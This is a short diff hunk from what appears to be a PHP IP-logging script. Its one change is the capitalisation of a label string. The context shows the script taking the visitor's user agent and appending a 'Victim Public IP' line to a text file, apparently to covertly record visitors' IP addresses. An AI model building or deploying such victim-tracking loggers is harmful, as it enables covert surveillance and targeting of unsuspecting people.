@@ -17,7 +17,7 @@ $browser = $_SERVER['HTTP_USER_AGENT'];
 
 
 $file = 'ip.txt';  //this is the file to which the IP address will be written; name it your way.
-$victim = "victim public ip: ";
+$victim = "Victim Public IP: ";
 $fp = fopen($file, 'a');
 
 fwrite($fp, $victim);
